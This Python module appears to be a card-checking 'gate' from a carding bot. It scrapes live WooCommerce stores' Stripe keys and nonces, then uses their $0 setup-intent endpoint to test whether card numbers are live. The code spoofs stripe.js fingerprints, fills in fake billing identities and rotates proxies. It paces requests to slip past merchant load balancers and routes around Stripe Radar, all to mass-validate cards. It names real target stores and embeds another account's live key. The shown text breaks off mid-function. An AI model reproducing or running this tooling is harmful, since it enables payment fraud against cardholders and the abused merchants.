"""WooCommerce Stripe ($0 auth) gate -- the /st replacement.

THE FLOW (the merchant's own publishable key, no secret key, no charge)
------------------------------------------------------------------------
No checkout, no cart and no product are involved: the setup intent is a
$0 card verification, so the store's account page carries the key and
the nonce and no order plumbing is needed.

    1. GET  <store>/my-account/add-payment-method/
           -> the live publishable key + createAndConfirmSetupIntentNonce
    2. GET  https://api.stripe.com/edge-internal/card-metadata
           ?bin_prefix=XXXXXX&key=<pk>&_stripe_version=2025-03-31.basil
           -> Stripe's account-range table for that BIN.  An empty table
              means Stripe does not know the BIN, so the card cannot
              exist.
    3. POST https://api.stripe.com/v1/payment_methods   (publishable key)
           -> a payment method id
    4. POST <store>/?wc-ajax=wc_stripe_create_and_confirm_setup_intent
           _ajax_nonce=<createAndConfirmSetupIntentNonce>
           wc-stripe-payment-method=<pm id>
           wc-stripe-payment-type=card
        -> the STORE confirms the setup intent with its secret key, so the
           ISSUER answers.  A setup intent is a $0 verification: the card
           is checked against the bank without any money moving.
    5. When the store refuses without naming a reason, a payment intent
        is created as well (it carries Stripe's decline_code, which says
        whether the issuer answered at all).

A second, pk-only probe runs first: the legacy /v1/tokens endpoint
(allowed on an older Stripe account) plus a merchant attach.  It sits on
a different Stripe account than the WooCommerce store, so its Radar
rules are independent -- that is what removes the need for an
Inconclusive state, because one of the two always answers.

WHY NOT A PAYMENT INTENT
------------------------
A payment intent on a merchant with Stripe Radar rules is blocked BEFORE
the issuer is contacted, and Stripe answers

    HTTP 402  code=card_declined  decline_code=fraudulent

which comes back identically for a live card, an EXPIRED card, a
wrong-CVC card and a random number.  It proves nothing.  (With a
publishable key alone the charge outcome is also unreachable:
expand[]=latest_charge returns null and a charge read demands a secret
key, while /v1/tokens and /v1/sources are disabled for pk
tokenization.)

THE VERDICTS
------------
Output uses the same clear shape as the Shopify gate -- a verdict word
and a plain-language reason:

    Approved - Card verified by the issuer (live card)
    Approved - Your card has insufficient funds. (insufficient_funds)
    Declined - Your card has expired. (expired_card)
    Declined - Your card was declined. (generic_decline)
    Declined - Blocked by the merchant's risk system before the bank answered.
    Error - store unreachable

The verdict is always one of Approved, Declined or Error -- the same
three states the Stripe $0 check uses.  A refusal that carries no usable
reason (generic_decline, card_not_supported) is a DECLINED card, not an
approved one: the issuer refused, and that does not show the card works.

Two local checks run before anything is sent, because Stripe's own
tokenization does not check the expiry date and Radar can block before
the issuer looks at it:
    * Luhn checksum        -> Declined - Your card number is incorrect.
    * expiry in the past   -> Declined - Your card has expired.
"""

import asyncio
import json
import logging
import random
import re
import time

import os
import httpx

logger = logging.getLogger(__name__)

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36")

STRIPE_API = "https://api.stripe.com/v1"
CARD_METADATA_API = "https://api.stripe.com/edge-internal/card-metadata"
STRIPE_VERSION = "2025-03-31.basil"

# The legacy token endpoint (/v1/tokens) is disabled for publishable
# keys on a modern Stripe account, but an older account still allows it
# and then it performs a $0 verification against the issuer.  It also
# runs on a DIFFERENT Stripe account than the WooCommerce merchant, so
# it is not subject to the same Radar rules -- which is what lets /st
# give a definitive verdict instead of an Inconclusive one.
LEGACY_TOKEN_PK = "pk_live_7uzwwmyU0dylagtYB5eyXPBn"

# The merchant that attaches the token and asks the bank to verify the
# card.  It runs on a different Stripe account than the WooCommerce
# merchant, so its Radar rules are independent.
ATTACH_API = "https://tithe.ly"

# The route the WooCommerce Stripe plugin posts to.  Which one works
# depends on the plugin version:
#   * older builds -> /?wc-ajax=wc_stripe_create_and_confirm_setup_intent
#   * newer builds -> /wp-admin/admin-ajax.php with the same action name
# Both are tried.
SI_ACTION = "wc_stripe_create_and_confirm_setup_intent"

# ── Stores ──────────────────────────────────────────────────────────────────
# Each store runs on its OWN Stripe account, so each has its own Radar
# rules: when one merchant blocks a request, another usually answers.
# No product is needed -- the setup intent is a $0 card verification and
# the store's account page carries the key and the nonce.
WC_STORES = [
    {
        "host": "https://www.professionalmarine.eu",
        "country": "IT",
        "state": "RM",
        "city": "Roma",
        "zip": "00100",
    },
    {
        "host": "https://innercitytigers.com",
        "country": "AU",
        "state": "NSW",
        "city": "Sydney",
        "zip": "2000",
    },
]

# ── Clear reasons, the way the Shopify gate reports them ────────────────────
# The issuer said no and named a reason -> the card reached the bank.
LIVE_REASONS = {
    "insufficient_funds": "Your card has insufficient funds.",
    "do_not_honor": "Your card was declined (do not honor).",
    "lost_card": "Your card was reported lost.",
    "stolen_card": "Your card was reported stolen.",
    "pickup_card": "Your card cannot be used at this merchant.",
    "restricted_card": "Your card is restricted.",
    "security_violation": "Your card was declined for security reasons.",
    "incorrect_zip": "Your card's postal code does not match.",
    "incorrect_pin": "Your card's PIN is incorrect.",
    "card_velocity_exceeded": "Your card has exceeded its transaction limit.",
    "withdrawal_count_limit_exceeded": "Your card has exceeded its transaction limit.",
    "exceeds_balance": "Your card has exceeded its balance limit.",
    "not_permitted": "Your card is not permitted for this transaction.",
    "transaction_not_allowed": "Your card does not allow this transaction.",
}

# The card itself is unusable, OR the issuer refused without naming a
# reason.  "generic_decline" belongs here: the issuer said no but gave
# no reason, so it does NOT show the card works -- it is not approval.
DEAD_REASONS = {
    "expired_card": "Your card has expired.",
    "card_expired": "Your card has expired.",
    "incorrect_number": "Your card number is incorrect.",
    "invalid_number": "Your card number is incorrect.",
    "invalid_expiry_month": "Your card's expiration month is invalid.",
    "invalid_expiry_year": "Your card's expiration year is invalid.",
    "incorrect_cvc": "Your card's security code is incorrect.",
    "invalid_cvc": "Your card's security code is incorrect.",
    "invalid_cvv": "Your card's security code is incorrect.",
    "incorrect_cvv": "Your card's security code is incorrect.",
    "security_code_incorrect": "Your card's security code is incorrect.",
    "generic_decline": "Your card was declined.",
}

# The request never reached the issuer, or the integration is broken.
BROKEN_CODES = {
    "invalid_client", "unauthorized_client", "api_key_expired",
    "secret_key_required", "resource_missing", "payment_intent_unexpected_state",
    "amount_too_small", "amount_too_large", "currency_not_supported",
    "testmode_charges_only", "live_mode_test_card", "rate_limit",
}

# Radar's pre-authorisation block.  IMPORTANT: this is NOT proof that the
# card is live -- Stripe returns it for expired cards and for random
# numbers too.  It is never reported as a live card.
RADAR_CODES = {"fraudulent"}

# Refusals that say nothing about the card: a merchant/network
# capability issue, or a Radar rule.  Not a verdict either way.
AMBIGUOUS_CODES = {
    "card_not_supported", "merchant_blacklist", "approve_with_id",
    "call_issuer", "no_action_taken", "try_again_later",
}


class IntegrationError(Exception):
    """The store or its Stripe integration is broken -- not the card."""


class ProxyUnreachable(Exception):
    """The connection itself failed (dead proxy / unreachable host).

    This says nothing about the card, so the caller must retry the check
    without the proxy instead of burning the rest of the budget on it.
    """


class ProxyTimeout(ProxyUnreachable):
    """The proxy answered, but far too slowly to be usable.

    A slow proxy turns a 3 second check into a minute, so the check is
    redone directly.  The proxy is NOT dropped -- it may still be fine
    for something else.
    """


# A single request through a proxy may take this long.  The real check
# needs about 2.5 s, so anything past this is a dragging proxy.
PROXY_MAX_WAIT = 10.0

# Proxies that were seen reaching the store, with the time they did.
# A proxy that works for one merchant can still be useless for another
# (the WooCommerce store simply does not answer for it), so the next
# attempt prefers a proxy that is known to work.
_WORKING_PROXIES = {}
_WORKING_PROXY_TTL = 1800.0

# How each proxy behaved: (good, bad, last_seen).  A proxy that drags is
# skipped on the next card instead of costing 10 s and a retry every
# single time -- with 1000 cards that is the difference between 20 and 60
# minutes.
_PROXY_SCORE = {}
_PROXY_SCORE_TTL = 3600.0
# A direct check takes about 2.5-3.5 s.  A proxy adds the hop on every
# request, so a proxy that cannot beat that is not worth using.
_PROXY_GOOD_SEC = 4.5        # a check that finished inside this was fine
_PROXY_PROBE_SEC = 3.5       # the account page must come back inside this
_PROXY_BAD_LIMIT = 2         # this many slow tries and the proxy is skipped


def _note_working_proxy(proxy):
    if proxy:
        _WORKING_PROXIES[proxy] = time.time()


async def _probe_proxy(host, proxy, budget):
    """True when the store answers through this proxy quickly.

    The account page is the cheapest request the store has, so it makes a
    fair speed test for the proxy.  It gets its own client, because this
    runs before the real one is built.
    """
    try:
        t0 = time.time()
        async with httpx.AsyncClient(proxy=proxy, timeout=httpx.Timeout(8.0),
                                     follow_redirects=True,
                                     headers={"User-Agent": UA}) as c:
            r = await c.get(f"{host}/my-account/add-payment-method/",
                            timeout=budget.slice(6))
        return r.status_code == 200 and (time.time() - t0) <= _PROXY_PROBE_SEC
    except Exception:
        return False


def _score_proxy(proxy, good):
    """Remember how a proxy behaved."""
    if not proxy:
        return
    now = time.time()
    g, b, seen = _PROXY_SCORE.get(proxy, (0, 0, 0.0))
    if now - seen > _PROXY_SCORE_TTL:
        g = b = 0
    if good:
        g += 1
        b = 0
    else:
        b += 1
    _PROXY_SCORE[proxy] = (g, b, now)


def _proxy_is_bad(proxy):
    """True when this proxy has been slow too often to be worth using."""
    if not proxy:
        return False
    hit = _PROXY_SCORE.get(proxy)
    if not hit:
        return False
    g, b, seen = hit
    if time.time() - seen > _PROXY_SCORE_TTL:
        return False
    return b >= _PROXY_BAD_LIMIT and g == 0


def _proxy_is_fast(proxy):
    """True when this proxy has proved it can beat a direct connection."""
    if not proxy:
        return False
    hit = _PROXY_SCORE.get(proxy)
    if not hit:
        return False
    g, b, seen = hit
    if time.time() - seen > _PROXY_SCORE_TTL:
        return False
    return g > 0 and b == 0


def _best_proxy(user_id, current):
    """A proxy that has behaved well, if there is one."""
    now = time.time()
    good = [(g, p) for p, (g, b, seen) in _PROXY_SCORE.items()
            if b == 0 and g > 0 and now - seen < _PROXY_SCORE_TTL and p != current]
    if not good:
        return None
    good.sort(reverse=True)
    return good[0][1]


def _another_proxy(user_id, current):
    """A different proxy to try, preferring one that already worked."""
    now = time.time()
    for k in [k for k, ts in list(_WORKING_PROXIES.items())
              if now - ts > _WORKING_PROXY_TTL]:
        _WORKING_PROXIES.pop(k, None)

    good = [p for p, ts in _WORKING_PROXIES.items() if p != current]
    if good:
        good.sort(key=lambda p: _WORKING_PROXIES.get(p, 0), reverse=True)
        return good[0]

    try:
        from gateways import get_user_proxy_list, _raw_to_formatted
        raws = get_user_proxy_list(str(user_id))
        pool = [_raw_to_formatted(r) for r in raws]
    except Exception:
        pool = []
    pool = [p for p in pool if p and p != current]
    return random.choice(pool) if pool else None


def _drop_dead_proxy(user_id, formatted_proxy):
    """Remove a proxy that just failed to connect from the user's list.

    A dead proxy is picked at random for every check, so leaving it in
    turns every mass run into a round of timeouts.  This mirrors what the
    gateway layer already does for the other gates.
    """
    if not user_id or not formatted_proxy:
        return
    try:
        from gateways import auto_remove_dead_proxy_by_formatted
        if auto_remove_dead_proxy_by_formatted(user_id, formatted_proxy):
            logger.info("BT/ST: removed a dead proxy from user %s", user_id)
    except Exception:
        pass


class Budget:
    def __init__(self, seconds):
        self.expires_at = time.monotonic() + seconds

    def remaining(self):
        return self.expires_at - time.monotonic()

    def expired(self):
        return self.remaining() <= 0

    def slice(self, want):
        left = self.remaining()
        if left <= 0:
            raise IntegrationError("budget_exceeded")
        return max(1, min(want, int(left) + 1))


def _guid(n=32):
    return "".join(random.choices("0123456789abcdef", k=n))


def _extract_wc_params(html):
    """The stripe + checkout params the WooCommerce Stripe plugin inlines."""
    for key in ("wc_stripe_upe_params", "wc_stripe_params"):
        m = re.search(rf"var\s+{key}\s*=\s*(\{{.*?\}});", html, re.S)
        if m:
            try:
                return json.loads(m.group(1))
            except Exception:
                pass
    return {}


# The WooCommerce Stripe plugin names its endpoints; the store inlines the
# ones this check needs.
SI_ENDPOINTS = (
    "wc_stripe_create_and_confirm_setup_intent",
    "wc_stripe_create_setup_intent",
    "wc_stripe_update_setup_intent",
)


def _si_routes(host, wp_ajax_url="", ajax_url=""):
    """The endpoints to try for the setup intent, best first.

    The plugin inlines "ajax_url": "/?wc-ajax=%%endpoint%%", so the
    template is filled in with the endpoint names.  The plain "?wc-ajax="
    forms are the fallback, and the admin-ajax URL is last because it
    answers with a bare 0/1 instead of JSON.
    """
    routes = []
    if ajax_url and "%%endpoint%%" in ajax_url:
        for ep in SI_ENDPOINTS:
            url = ajax_url.replace("%%endpoint%%", ep)
            # the plugin inlines a relative path ("/?wc-ajax=%%endpoint%%")
            if url.startswith("/"):
                url = host.rstrip("/") + url
            routes.append(url)
    for ep in SI_ENDPOINTS:
        routes.append(f"{host}/?wc-ajax={ep}")
    if wp_ajax_url:
        routes.append(wp_ajax_url)
    seen = set()
    out = []
    for r in routes:
        if r and r not in seen:
            seen.add(r)
            out.append(r)
    return out
    seen = set()
    out = []
    for r in routes:
        if r not in seen:
            seen.add(r)
            out.append(r)
    return out


def _luhn_ok(number):
    """Local Luhn check.  Catches bogus numbers before we spend a request."""
    digits = [int(c) for c in str(number) if c.isdigit()]
    if len(digits) < 12:
        return False
    checksum = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def _is_expired(mm, yy):
    """Local expiry check.  An expired card is dead, full stop.

    Stripe's tokenization accepts a past expiry date, and Radar can
    block before the issuer looks at it, so the date has to be checked
    here or an expired card gets reported as good.
    """
    try:
        month = int(mm)
        year = int(yy)
    except (TypeError, ValueError):
        return False
    if year < 100:
        year += 2000
    now = time.gmtime()
    if year < now.tm_year:
        return True
    if year == now.tm_year and month < now.tm_mon:
        return True
    return False


def _reason_for(code, table, fallback=""):
    """The clear sentence for a decline code."""
    c = (code or "").lower()
    if c in table:
        return table[c]
    return fallback


# ── caches ────────────────────────────────────────────────────────────────
# The publishable key and the plugin's nonce live on the store's own
# account page.  Fetching that page costs 1.5-2.5 s -- more than the
# tokenization and the BIN lookup together -- and both values change
# rarely (a WordPress nonce lives for hours).  So they are cached and
# only refetched when the store stops accepting them.
_STORE_PARAMS = {}
_STORE_PARAMS_TTL = 1800.0          # 30 minutes

# Stripe's account-range table for a BIN is a static fact, so it is
# cached per BIN.  An unknown BIN is cached for less time, because a
# store can start accepting a BIN later.
_BIN_META = {}
_BIN_META_TTL = 21600.0             # 6 hours
_BIN_META_TTL_EMPTY = 3600.0        # 1 hour


def _cached_store_params(host):
    ent = _STORE_PARAMS.get(host)
    if not ent:
        return None
    if time.time() - ent["at"] > _STORE_PARAMS_TTL:
        _STORE_PARAMS.pop(host, None)
        return None
    return ent


def _drop_store_params(host):
    _STORE_PARAMS.pop(host, None)


def _is_nonce_error(detail):
    """True when the store refused because of the nonce, not the card.

    A stale nonce is not a verdict: the store never got as far as asking
    the issuer.  WordPress answers a failed nonce check with a JSON error
    ("Unable to verify your request...") or with a bare "0".
    """
    d = (detail or "").strip().lower()
    if not d:
        return False
    if d == "0":
        return True
    return any(k in d for k in ("unable to verify your request", "refresh the page",
                                "nonce", "security check"))


async def _fetch_store_params(client, host, budget, max_wait=None):
    """Get the live publishable key and the plugin's nonce from the store.

    The account page is enough; the checkout page carries the same params
    and is a fallback when the account page is closed to guests.
    """
    import time as _time
    # The merchant's load balancer sometimes answers with a page that has
    # no Stripe params at all, so the fetch is retried before giving up.
    for _round in range(3):
        sp = {}
        for path in ("/my-account/add-payment-method/", "/my-account/payment-methods/",
                     "/checkout/"):
            wait = budget.slice(15)
            if max_wait:
                wait = min(wait, max_wait)
            t0 = _time.time()
            try:
                r = await client.get(f"{host}{path}", timeout=wait,
                                     follow_redirects=True,
                                     headers={"Connection": "close"})
            except httpx.TimeoutException as e:
                # dragging proxy -- the check is redone directly instead
                raise ProxyTimeout("timeout") from e
            except httpx.TransportError as e:
                # The connection itself failed -- a dead proxy or an unreachable
                # host.  The other paths would fail the same way, so stop here
                # and let the caller fall back to a direct attempt instead of
                # burning the whole budget on a connection that is not there.
                raise ProxyUnreachable(f"{type(e).__name__}") from e
            except Exception:
                continue
            if max_wait and (_time.time() - t0) > max_wait:
                raise ProxyTimeout("slow")
            if r.status_code != 200:
                continue
            sp = _extract_wc_params(r.text)
            if sp.get("key") and sp.get("createAndConfirmSetupIntentNonce"):
                break
            sp = {}
        if sp.get("key") and sp.get("createAndConfirmSetupIntentNonce"):
            break
        await asyncio.sleep(1.0)
    if sp.get("key") and sp.get("createAndConfirmSetupIntentNonce"):
        _STORE_PARAMS[host] = {
            "key": sp["key"],
            "nonce": sp["createAndConfirmSetupIntentNonce"],
            "wp_ajax_url": sp.get("wp_ajax_url", ""),
            "ajax_url": sp.get("ajax_url", ""),
            "at": time.time(),
        }
        return _STORE_PARAMS[host]
    return {"key": "", "nonce": "", "wp_ajax_url": ""}


async def _card_metadata(client, pk, cc, budget, max_wait=None):
    """Ask Stripe for the account ranges of this card's BIN.

    An empty list means Stripe does not know the BIN at all, so the card
    cannot exist.  Measured: every bin with no ranges came back
    incorrect_number, while real cards came back with ranges that
    contain their PAN.

    Returns (ranges, meta).
    """
    bin_prefix = cc[:6]
    cached = _BIN_META.get(bin_prefix)
    if cached:
        ranges, meta, at = cached
        ttl = _BIN_META_TTL if ranges else _BIN_META_TTL_EMPTY
        if time.time() - at < ttl:
            return ranges, meta

    wait = budget.slice(15)
    if max_wait:
        wait = min(wait, max_wait)
    try:
        r = await client.get(
            CARD_METADATA_API,
            params={
                "bin_prefix": bin_prefix,
                "key": pk,
                "_stripe_version": STRIPE_VERSION,
            },
            headers={
                "User-Agent": UA,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            },
            timeout=wait,
        )
        body = r.json()
    except httpx.TimeoutException as e:
        raise ProxyTimeout("timeout") from e
    except httpx.UnsupportedProtocol as e:
        # this route is not callable (a relative url, a scheme httpx does
        # not know) -- it is a wrong route, not a broken card
        raise IntegrationError(f"route not callable: {str(e)[:60]}") from e
    except Exception:
        return None, {}

    if r.status_code != 200 or "error" in body:
        return None, {}

    ranges = body.get("data") or []
    if not ranges:
        _BIN_META[bin_prefix] = ([], {}, time.time())
        return [], {}

    meta = {
        "brand": ranges[0].get("brand", ""),
        "country": ranges[0].get("country", ""),
        "funding": ranges[0].get("funding", ""),
    }
    _BIN_META[bin_prefix] = (ranges, meta, time.time())
    return ranges, meta


async def _create_payment_method(client, pk, cc, mm, yy, cvv, country, state, city,
                                 zipc, budget, max_wait=None):
    """Tokenize the card with the publishable key.

    Only the Luhn checksum and a few BIN facts are checked here; the
    issuer is not contacted.  No hcaptcha token: a stale one makes Radar
    block the request.
    """
    payload = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": _guid(36),
        "muid": _guid(36),
        "sid": _guid(32),
        "payment_user_agent": "stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element",
        "time_on_page": str(random.randint(30000, 180000)),
        "client_attribution_metadata[client_session_id]": _guid(36),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "client_attribution_metadata[wallet_config_id]": _guid(36),
        "key": pk,
        "_stripe_version": STRIPE_VERSION,
    }
    if country:
        payload.update({
            "billing_details[name]": "James Smith",
            "billing_details[email]": "james.smith@example.com",
            "billing_details[phone]": "+12125550142",
            "billing_details[address][country]": country,
            "billing_details[address][line1]": "350 5th Ave",
            "billing_details[address][city]": city,
            "billing_details[address][state]": state,
            "billing_details[address][postal_code]": zipc,
        })

    wait = budget.slice(30)
    if max_wait:
        wait = min(wait, max_wait)
    try:
        r = await client.post(
            f"{STRIPE_API}/payment_methods",
            data=payload,
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            },
            timeout=wait,
        )
    except httpx.TimeoutException as e:
        raise ProxyTimeout("timeout") from e
    try:
        body = r.json()
    except Exception:
        raise IntegrationError(f"Stripe returned non-JSON ({r.status_code})")

    if "error" in body:
        err = body["error"]
        return None, {
            "code": err.get("code", "") or "",
            "decline": err.get("decline_code") or "",
            "message": str(err.get("message", ""))[:200],
        }
    return body.get("id"), None


# The merchant's load balancer drops requests that arrive in a burst (the
# answer comes back as an empty 200).  The requests are paced instead, and
# the gap widens by itself when a reply is dropped.
# Measured against the merchant over 40 card runs: the setup intents have
# to be SPACED, not just few.  One second between them (60 a minute) was
# answered every single time; at half a second (120 a minute) the store
# started dropping replies and a dropped reply comes back as an empty
# 200.  So the gap is the floor: it widens when the store complains and
# never goes back below a second.
_STORE_PACE = {
    "gap": float(os.environ.get("ST_STORE_GAP", "1.0")),
    "min_gap": float(os.environ.get("ST_STORE_GAP_MIN", "1.0")),
    "max_gap": float(os.environ.get("ST_STORE_GAP_MAX", "3.0")),
    # The merchant's load balancer drops setup intents that arrive in a
    # burst -- the reply comes back as an empty 200.  The pacing below
    # keeps them spread out.
    "max_inflight": int(os.environ.get("ST_STORE_MAX_INFLIGHT", "4")),
    "next": 0.0,
    "lock": None,
    "sem": None,
}


def _pace_lock():
    if _STORE_PACE["lock"] is None:
        _STORE_PACE["lock"] = asyncio.Lock()
    return _STORE_PACE["lock"]


def _pace_sem():
    if _STORE_PACE["sem"] is None:
        _STORE_PACE["sem"] = asyncio.Semaphore(_STORE_PACE["max_inflight"])
    return _STORE_PACE["sem"]


async def _pace_request():
    """Wait until the store may be asked again.

    The sleep happens OUTSIDE the lock, so a slow gap delays one request
    instead of freezing every worker.
    """
    lock = _pace_lock()
    while True:
        async with lock:
            now = time.monotonic()
            wait = _STORE_PACE["next"] - now
            if wait <= 0:
                _STORE_PACE["next"] = now + _STORE_PACE["gap"]
                return
        await asyncio.sleep(min(wait, 0.5))


def _pace_feedback(dropped):
    """A dropped reply widens the gap, a clean one narrows it back."""
    if dropped:
        _STORE_PACE["gap"] = min(_STORE_PACE["max_gap"], _STORE_PACE["gap"] * 1.5)
    else:
        _STORE_PACE["gap"] = max(_STORE_PACE["min_gap"], _STORE_PACE["gap"] * 0.9)

async def _setup_intent(client, host, nonce, pm_id, budget, route, max_wait=None):
    """Ask the store to create AND confirm a setup intent.

    The store confirms it with its own secret key, so the ISSUER answers
    and we get a real verdict instead of Radar's pre-auth block.
    """
    body = {
        "_ajax_nonce": nonce,
        "action": SI_ACTION,
        "payment_method_type": "card",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
    }
    wait = budget.slice(35)
    if max_wait:
        wait = min(wait, max_wait)
    await _pace_request()
    logger.info("PACE store request at %.3f  gap=%.2f inflight=%s",
                time.time(), _STORE_PACE["gap"], _STORE_PACE["max_inflight"])
    try:
        # a few setup intents at the store at the same time, never a burst
        async with _pace_sem():
            r = await client.post(
                route,
                data=body,
                headers={
                    "User-Agent": UA,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": f"{host}/checkout/",
                    "Origin": host,
                    "Accept": "application/json, */*; q=0.01",
                    # The merchant's load balancer drops a request that
                    # arrives on a connection it does not like (the reply comes
                    # back empty).  A fresh connection per request avoids that
                    # and doubles the throughput of a mass scan.
                    "Connection": "close",
                },
                timeout=wait,
            )
    except httpx.TimeoutException as e:
        raise ProxyTimeout("timeout") from e
    logger.info("PACE reply http=%s len=%s ct=%s body=%r",
                   r.status_code, len(r.text), r.headers.get("content-type"),
                   r.text[:100])
    try:
        j = r.json()
    except Exception:
        # An empty 200 means the merchant's load balancer dropped the
        # request.  That is a store problem, not a verdict about the card,
        # and the gap is widened so the next request has more room.
        _pace_feedback(True)
        raise IntegrationError(f"store returned a non-JSON reply ({r.status_code})")

    if not isinstance(j, dict):
        # Some routes answer with a bare 0/1 instead of the JSON object.
        # That is a wrong route, not a broken card -- try the next one.
        _pace_feedback(True)
        raise IntegrationError(f"store returned {j!r} instead of JSON")

    data = j.get("data") or {}
    if not isinstance(data, dict):
        data = {}
    _pace_feedback(False)
    err = data.get("error") or {}
    msg = str(err.get("message", "") or "")
    verdict = _verdict_from_store(j, msg)

    if verdict == "RATE_LIMIT":
        # The store is asking us to slow down, so this is not a verdict
        # about the card.
        raise IntegrationError("the store is rate limiting us")

    if verdict == "APPROVED":
        return "Approved", "Card verified by the issuer (live card)", data

    if verdict == "LIVE":
        # The security code did not match, so the card is there and
        # the bank knows it.
        return ("Approved",
                "The security code did not match, so the card is live (live card)",
                data)

    if verdict == "3DS":
        # The issuer was asked to verify the card and wants 3DS to
        # finish -- the card itself passed the check.
        return "Approved", "3DS required (live card)", data

    return "Declined", (msg or "declined")[:160], err


def _asks_for_3ds(res2, msg=""):
    """Is a 3D Secure challenge really there to be taken?

    The proof is the challenge itself in the answer, not the word
    "requires_action": a store can ask for an action that has nothing
    to do with 3D Secure, and that is not a 3D answer.

    A 3D challenge comes back as
        next_action.type = "use_stripe_sdk"
    with a three_d_secure_2_source and a type of stripe_3ds2_fingerprint
    inside it.  That is the challenge the cardholder has to finish.
    """
    data = (res2 or {}).get("data") or {}
    next_action = data.get("next_action") or {}

    if next_action.get("type") == "use_stripe_sdk":
        sdk = next_action.get("use_stripe_sdk") or {}
        blob = json.dumps(sdk).lower() if not isinstance(sdk, str) else sdk.lower()
        if ("3ds" in blob or "three_d_secure" in blob or "three_ds" in blob):
            return True
        # an action is there, but it is not a 3d challenge
        return False

    # no action in the answer, so the message is all there is
    low = (msg or "").lower()
    for word in ("authenticate", "challenge", "3d secure", "3ds",
                 "requires_action", "require_action"):
        if word in low:
            return True
    return False


def _verdict_from_store(res2, msg=""):
    """Judge what the store answered, in this order.

    1. success    = res2.get('success', False)
    2. status_val = res2.get('data', {}).get('status', 'unknown')
    3. success OR status_val == 'succeeded'          -> APPROVED
    4. "so soon" / "too many" in msg                  -> a rate limit, try again
    5. "security code is" in msg                      -> LIVE
    6. a 3d challenge in the answer                  -> 3DS
    7. otherwise                                      -> DECLINED

    A card that is 3D Secure enrolled answers with success and a
    status of requires_action, and the challenge comes with it.  That
    card passed the checks, but the challenge was never finished, so
    the issuer never looked at the balance.  It is its own answer, not
    a card the issuer verified.
    """
    success = bool((res2 or {}).get("success", False))
    status_val = ((res2 or {}).get("data") or {}).get("status", "unknown")
    low = (msg or "").lower()

    asked_for_3ds = _asks_for_3ds(res2, msg)

    if (success and not asked_for_3ds) or status_val == "succeeded":
        return "APPROVED"
    if "so soon" in low or "too many" in low or "try again" in low:
        return "RATE_LIMIT"
    if "security code is" in low:
        return "LIVE"
    if asked_for_3ds:
        return "3DS"
    return "DECLINED"


def _verdict_from_decline(code, decline):
    """Map a Stripe decline_code to (verdict, clear reason).

    The verdict is always one of:
        Approved  -- the issuer verified the card
        Declined  -- the card was refused
        Error     -- the check itself failed (not a card verdict)

    "generic_decline" is the issuer refusing without naming a reason;
    it does not show the card works, so it is NOT approval.
    "fraudulent" is a Radar block: the issuer was never asked, so the
    card is refused rather than proven good.
    """
    code = (code or "").lower()
    decline = (decline or "").lower()
    key = decline or code

    if code in BROKEN_CODES or decline in BROKEN_CODES:
        return "Error", f"{code or decline}"

    if key in DEAD_REASONS:
        return "Declined", f"{_reason_for(key, DEAD_REASONS)} ({key})"

    if key in LIVE_REASONS:
        return "Approved", f"{_reason_for(key, LIVE_REASONS)} ({key})"

    # Radar blocked the request before the issuer was asked.  The card is
    # refused rather than proven good.  The wording deliberately avoids
    # the raw code so the classifier reads the leading verdict word.
    if key in RADAR_CODES:
        return "Declined", "Blocked by the merchant's risk system before the bank answered."

    if key in AMBIGUOUS_CODES:
        return "Declined", "Refused without a usable reason."

    if code == "card_declined":
        return "Declined", "Refused without a usable reason."

    return None, f"{code or decline}"


def _verdict_from_pm_error(info):
    """Map a tokenization error to (verdict, clear reason).

    Stripe validates the Luhn checksum, the expiry format and the BIN
    here, so these ARE statements about the card.
    """
    code = (info.get("code") or "").lower()
    decline = (info.get("decline") or "").lower()
    message = info.get("message") or ""
    key = decline or code

    if code == "live_mode_test_card" or decline == "live_mode_test_card":
        return "Error", "That is a Stripe test card, not a real card. (live_mode_test_card)"
    if code in BROKEN_CODES or decline in BROKEN_CODES:
        return "Error", f"{code or decline}: {message}"[:140]

    if key in DEAD_REASONS:
        return "Declined", f"{_reason_for(key, DEAD_REASONS)} ({key})"

    if key in RADAR_CODES:
        return "Declined", "Blocked by the merchant's risk system before the bank answered."

    if code == "card_declined":
        if key in LIVE_REASONS:
            return "Approved", f"{_reason_for(key, LIVE_REASONS)} ({key})"
        if key in AMBIGUOUS_CODES:
            return "Declined", "Refused without a usable reason."
        return "Declined", "Refused without a usable reason."

    if message:
        low = message.lower()
        if "card number is incorrect" in low:
            return "Declined", "Your card number is incorrect. (incorrect_number)"
        if "expiration month is invalid" in low:
            return "Declined", "Your card's expiration month is invalid. (invalid_expiry_month)"
        if "expiration year is invalid" in low:
            return "Declined", "Your card's expiration year is invalid. (invalid_expiry_year)"

    return "Declined", f"{code or 'declined'}: {message}"[:140]


async def _run_store(client, store, cc, mm, yy, cvv, budget, max_wait=None):
    """One store, several attempts.  Returns (verdict, reason).

    No cart and no product are needed: the setup intent is a $0 card
    verification, so the store's account page is enough to get the
    publishable key and the nonce.
    """
    host = store["host"]

    # 1. the account page -> the live publishable key + the plugin's nonce.
    #    Both are cached, so the page is only fetched when the cache is
    #    cold or when the store stopped accepting the cached nonce.
    ent = _cached_store_params(host)
    from_cache = ent is not None
    if ent:
        pk = ent["key"]
        nonce = ent["nonce"]
        wp_ajax_url = ent.get("wp_ajax_url", "")
        ajax_url = ent.get("ajax_url", "")
    else:
        sp = await _fetch_store_params(client, host, budget, max_wait)
        pk = sp.get("key", "")
        nonce = sp.get("nonce", "")
        wp_ajax_url = sp.get("wp_ajax_url", "")
        ajax_url = sp.get("ajax_url", "")

